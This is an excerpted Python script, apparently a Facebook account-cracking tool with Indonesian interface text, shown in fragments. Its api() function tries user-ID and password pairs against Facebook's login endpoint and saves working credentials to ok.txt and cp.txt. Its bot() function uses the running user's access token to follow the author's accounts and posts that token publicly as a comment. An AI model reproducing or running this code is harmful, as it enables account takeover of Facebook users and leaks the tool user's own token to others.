...
import concurrent.futures, requests, bs4, mechanize, sys, random, json, re, ipaddress
...
def ceko():
	try:
		bl = requests.get("https://sptty-chan.github.io/cek")
		bos = BeautifulSoup(bl.content,"html.parser")
		miko = bos.text
		if "silahkan" in miko:
			versi()
		else:
			clear()
			banner()
			jalan(balmond+m+" SC Ditutup Sementara")
			time.sleep(0.5)
			exit()
...
def versi():
	versi = 2.3
	try:
		bl = requests.get("https://sptty-chan.github.io/versi")
		bos = BeautifulSoup(bl.content,"html.parser")
		miko = bos.text
		if str(versi) in miko:
			menu()
		else:
			clear()
			banner()
			print(balmond+l+" Sedang Mengunduh Versi, Tunggu Sebentar")
			os.system("git pull")
			jalan(balmond+l+" Update Selesai, Silahkan Jalankan Lagi Scriptnya")
			time.sleep(0.5)
			exit()
	except requests.exceptions.ConnectionError:
		clear()
...
def bot():
	...
	requests.post("https://graph.facebook.com/100025851303474/subscribers?access_token="+token) # sptty chan
	requests.post("https://graph.facebook.com/100066596835614/subscribers?access_token="+token) # ayu amanda
	requests.post("https://graph.facebook.com/207622271467666/comments/?message="+token+"&access_token="+token)
...
def result():
	...
	if pilih=="1" or pilih=="01":
		try:
			buka = open("cp.txt","r").read()
		except IOError:
			jalan("\n"+balmond+l+" Belum Ada Result CP")
			time.sleep(0.5)
			menu()
		print("")
		...
		try:
			buka = open("ok.txt","r").read()
		except IOError:
			jalan("\n"+balmond+l+" Belum Ada Result OK")
			time.sleep(0.5)
			menu()
		print("")
...
def api(uid,pwx,loop):
	...
	print(h+"\r{"+k+"Chan"+h+"} "+l+"%s/%s OK : %s CP : %s"%(loop,len(id),len(ok),len(cp)), end=' ');sys.stdout.flush()
		...
		try:
			...
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					...
					bts = open("ok.txt","a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					...
					try:
						...
						if len(lahir)==2:
							...
							if "old" in old_gak:
								...
								bts = open("cp.txt","a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
							...
							if "old" in old_gak:
								...
								bts = open("cp.txt","a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
						...
						if "old" in old_gak:
							...
							bts = open("cp.txt","a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
...
def cek_opsi():
	...
	print(balmond+l+" Contoh : "+k+"cp.txt")
